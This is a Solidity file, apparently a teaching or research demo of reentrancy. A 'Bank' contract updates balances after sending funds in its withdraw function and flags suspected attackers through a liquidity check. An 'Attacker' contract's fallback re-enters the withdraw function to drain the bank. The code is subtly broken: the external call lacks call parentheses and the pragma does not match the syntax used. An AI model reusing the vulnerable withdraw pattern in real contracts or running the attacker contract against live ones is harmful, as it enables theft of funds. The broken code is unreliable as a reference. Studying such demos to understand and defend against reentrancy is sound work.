// SPDX-License-Identifier: MIT
pragma solidity >= 0.4.26;

contract Bank {
    uint private participantsLiquidity;
    uint private beforeTransaction;
    uint private afterTransaction;
    address private attacker;
    address private bankUser;
    mapping(address => uint) private userBalance;

    constructor() public payable {
        bankUser = msg.sender;
        userBalance[msg.sender] += msg.value;
        participantsLiquidity = address(this).balance;
        beforeTransaction = address(this).balance;
        afterTransaction = 0;
    }
    modifier bankUserOnly() {
        require(msg.sender == bankUser, "message.sender is not the bank owner");
        _;
    }
    /** store attacker address */
    function getAttackerAddress() external view bankUserOnly returns(address) {
        return attacker;
    }
    /** deposit function */
    function depositFunds() external payable returns(bool){
        require(msg.value > 0 , "values not greater then zero");
        userBalance[msg.sender] += msg.value;
        afterTransaction = this.getBankLiquidity() - beforeTransaction;
        participantsLiquidity += afterTransaction;
        beforeTransaction = this.getBankLiquidity();
        afterTransaction = 0;
        return true;
    }
    /** withdraw function */
    function withdrawFunds(uint _value) public payable {
        require(_value <= userBalance[msg.sender], "account balance is low");
        if (this.getBankLiquidity() == this.getParticipantsLiquidity())
        {
            msg.sender.call{value: _value}; // statement of vulnerability
            userBalance[msg.sender] -= _value; // Update the customer balance
            participantsLiquidity -= _value; 
        }
        else
        {
            attacker = msg.sender;
            beforeTransaction = this.getBankLiquidity();
        }
    }
    /** transfer funds within contract */
    function transfer(address to, uint amount) public{
        if (this.getBankLiquidity() == this.getParticipantsLiquidity())
        {
            require(amount <= userBalance[msg.sender], "account balance is low");
            userBalance[to] += amount;
            userBalance[msg.sender] -= amount;
        }
        else
        {
            attacker = msg.sender;
            beforeTransaction = this.getBankLiquidity();
        }
    }
    /** bank liquidity function */
    function getBankLiquidity() external view returns(uint) {
        return address(this).balance;
    }
    /** participants liquidity function */
    function getParticipantsLiquidity() external view returns(uint) {
        return participantsLiquidity;
    }
    /** customer balance function */
    function getUserBalance() public view returns(uint) {
        return userBalance[msg.sender];
    }
}
contract Attacker {
    
    Bank public bank;
    mapping (address => uint) private attackerBalance;

    constructor(address bankAddress) public payable {
        bank = Bank(bankAddress);
        attackerBalance[address(this)] += msg.value;
    }

    /** deposit 1 ether into contract function */
    function deposit() public payable {
        bank.depositFunds{value: 1 ether}();
    }
    /** withdraw 1 ether from contract function */
    function withdraw() public payable {
        bank.withdrawFunds(1 ether);
    }
    /** get attacker balance */
    function getAttackerBalance() public view returns(uint) {
        return address(this).balance;
    }
    /** re-enter the withdraw function in the bank contract */
    fallback () external payable {
        if (bank.getBankLiquidity() > 1) {
            bank.withdrawFunds(1 ether);
        }
    }
}
